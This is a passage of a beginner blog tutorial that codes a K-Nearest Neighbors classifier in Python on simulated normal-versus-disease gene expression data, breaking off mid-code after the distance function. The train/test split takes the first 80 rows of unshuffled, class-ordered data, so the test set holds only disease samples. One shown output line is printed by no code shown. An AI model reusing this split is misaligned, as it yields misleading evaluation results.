        <content type="html"><![CDATA[<p>Machine learning is transforming bioinformatics, enabling us to discover patterns in biological data. In this first part, we'll build a K-Nearest Neighbors (KNN) classifier from scratch using only Python, then apply it to simulated gene expression data. This post is designed for anyone who knows basic Python and biology—no advanced ML experience required!</p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="why-machine-learning-in-bioinformatics">Why Machine Learning in Bioinformatics?<a href="https://riverxdata.github.io/river-docs/blog/machine-learning-bioinformatics-part1-knn#why-machine-learning-in-bioinformatics" class="hash-link" aria-label="Direct link to Why Machine Learning in Bioinformatics?" title="Direct link to Why Machine Learning in Bioinformatics?" translate="no">​</a></h2>
<p>Biologists today collect massive amounts of data:</p>
<ul>
<li class=""><strong>Gene expression</strong> from thousands of genes across different conditions</li>
<li class=""><strong>Patient samples</strong> with different disease states or treatment responses</li>
<li class=""><strong>Protein sequences</strong> that need classification</li>
<li class=""><strong>Imaging data</strong> from microscopy or medical scans</li>
</ul>
<p>Manually analyzing this data is impossible. Machine learning helps us:</p>
<ol>
<li class=""><strong>Find patterns</strong>: Automatically discover which genes distinguish disease types</li>
<li class=""><strong>Make predictions</strong>: Classify new patients based on gene expression patterns</li>
<li class=""><strong>Understand biology</strong>: Identify important features in biological systems</li>
</ol>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="what-is-knn">What is KNN?<a href="https://riverxdata.github.io/river-docs/blog/machine-learning-bioinformatics-part1-knn#what-is-knn" class="hash-link" aria-label="Direct link to What is KNN?" title="Direct link to What is KNN?" translate="no">​</a></h2>
<p>K-Nearest Neighbors (KNN) is one of the simplest yet powerful machine learning algorithms:</p>
<p><strong>The Idea</strong>: To classify a new sample, look at its K closest neighbors in your training data and vote on the class.</p>
<p><strong>Simple Example</strong>:</p>
<ul>
<li class="">Imagine you have cancer and normal patient samples plotted by gene expression</li>
<li class="">A new patient arrives</li>
<li class="">You find the 3 nearest patient samples (K=3)</li>
<li class="">If 2 are cancer and 1 is normal, you classify the new patient as cancer</li>
</ul>
<p><strong>Why start with KNN?</strong></p>
<ul>
<li class="">Easy to understand (no complex math)</li>
<li class="">Works well for bioinformatics data</li>
<li class="">Teaches core ML concepts: distance metrics, classification, and parameter tuning</li>
</ul>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="part-1-building-knn-from-scratch">Part 1: Building KNN from Scratch<a href="https://riverxdata.github.io/river-docs/blog/machine-learning-bioinformatics-part1-knn#part-1-building-knn-from-scratch" class="hash-link" aria-label="Direct link to Part 1: Building KNN from Scratch" title="Direct link to Part 1: Building KNN from Scratch" translate="no">​</a></h2>
<p>Let's code KNN step-by-step in Python. You'll understand exactly what's happening.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-1-import-libraries-and-create-simulated-gene-expression-data">Step 1: Import Libraries and Create Simulated Gene Expression Data<a href="https://riverxdata.github.io/river-docs/blog/machine-learning-bioinformatics-part1-knn#step-1-import-libraries-and-create-simulated-gene-expression-data" class="hash-link" aria-label="Direct link to Step 1: Import Libraries and Create Simulated Gene Expression Data" title="Direct link to Step 1: Import Libraries and Create Simulated Gene Expression Data" translate="no">​</a></h3>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> numpy </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">as</span><span class="token plain"> np</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> matplotlib</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">pyplot </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">as</span><span class="token plain"> plt</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">from</span><span class="token plain"> collections </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> Counter</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Set random seed for reproducibility</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">np</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">random</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">seed</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token number" style="color:hsl(35, 99%, 36%)">42</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Simulate gene expression data</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Let's say we have 100 samples with 2 genes (for easy visualization)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># In reality, we'd have thousands of genes</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">create_gene_expression_data</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">"""</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    Simulate gene expression data for two disease types</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    Gene expression = measured as normalized counts (e.g., from RNA-seq)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    """</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Class 0: Normal samples</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># These samples show low expression in both genes</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    normal </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> np</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">random</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">normal</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">loc</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">5</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> scale</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">1.5</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> size</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token number" style="color:hsl(35, 99%, 36%)">50</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Class 1: Disease samples</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># These samples show higher expression, especially in gene 1</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    disease </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> np</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">random</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">normal</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">loc</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">8</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> scale</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">1.5</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> size</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token number" style="color:hsl(35, 99%, 36%)">50</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Combine data and create labels</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    X </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> np</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">vstack</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain">normal</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> disease</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Features (gene expression)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    y </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> np</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">hstack</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain">np</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">zeros</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token number" style="color:hsl(35, 99%, 36%)">50</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> np</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">ones</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token number" style="color:hsl(35, 99%, 36%)">50</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Labels (0=normal, 1=disease)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">return</span><span class="token plain"> X</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> y</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Load data</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">X</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> y </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> create_gene_expression_data</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Split into training and test sets</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">train_size </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">80</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">X_train</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> X_test </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> X</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">train_size</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> X</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain">train_size</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">y_train</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> y_test </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> y</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">train_size</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> y</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain">train_size</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"Training set: </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">X_train</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token string-interpolation interpolation">shape</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string-interpolation interpolation number" style="color:hsl(35, 99%, 36%)">0</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)"> samples with </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">X_train</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token string-interpolation interpolation">shape</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string-interpolation interpolation number" style="color:hsl(35, 99%, 36%)">1</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)"> genes"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"Test set: </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">X_test</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token string-interpolation interpolation">shape</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string-interpolation interpolation number" style="color:hsl(35, 99%, 36%)">0</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)"> samples with </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">X_test</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token string-interpolation interpolation">shape</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string-interpolation interpolation number" style="color:hsl(35, 99%, 36%)">1</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)"> genes"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><br></span></code></pre></div></div>
<p><strong>Output:</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Training set: 80 samples with 2 genes</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Test set: 20 samples with 2 genes</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Classes: 50 Normal, 50 Disease</span><br></span></code></pre></div></div>
<p><strong>What we did:</strong></p>
<ul>
<li class="">Created 100 simulated patients (50 normal, 50 disease)</li>
<li class="">Each patient has expression levels for 2 genes</li>
<li class="">Normal patients: ~5 expression (biologically, lower expression)</li>
<li class="">Disease patients: ~8 expression (biologically, higher expression)</li>
<li class="">Split 80 samples for training, 20 for testing</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-2-calculate-distance-between-samples">Step 2: Calculate Distance Between Samples<a href="https://riverxdata.github.io/river-docs/blog/machine-learning-bioinformatics-part1-knn#step-2-calculate-distance-between-samples" class="hash-link" aria-label="Direct link to Step 2: Calculate Distance Between Samples" title="Direct link to Step 2: Calculate Distance Between Samples" translate="no">​</a></h3>
<p>KNN finds the "closest" neighbors. We need a distance metric. Let's implement <strong>Euclidean distance</strong>:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">euclidean_distance</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">sample1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> sample2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">"""</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    Calculate Euclidean distance between two samples.</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    Distance = sqrt((x1-x2)² + (y1-y2)² + ...)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    This measures "how different" two patients' gene expression profiles are.</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    """</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">return</span><span class="token plain"> np</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">sqrt</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">np</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token builtin" style="color:hsl(119, 34%, 47%)">sum</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">sample1 </span><span class="token operator" style="color:hsl(221, 87%, 60%)">-</span><span class="token plain"> sample2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">**</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Test distance calculation</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sample_a </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> np</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">array</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token number" style="color:hsl(35, 99%, 36%)">5.2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">4.8</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Normal patient (low expression)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sample_b </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> np</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">array</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token number" style="color:hsl(35, 99%, 36%)">8.1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">8.3</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Disease patient (high expression)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sample_c </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> np</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">array</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token number" style="color:hsl(35, 99%, 36%)">5.5</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">4.9</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Another normal patient (similar to A)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">dist_a_to_b </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> euclidean_distance</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">sample_a</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> sample_b</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">dist_a_to_c </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> euclidean_distance</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">sample_a</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> sample_c</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"Distance from normal A to disease B: </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">dist_a_to_b</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token string-interpolation interpolation format-spec">.2f</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"Distance from normal A to normal C: </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">dist_a_to_c</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token string-interpolation interpolation format-spec">.2f</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" 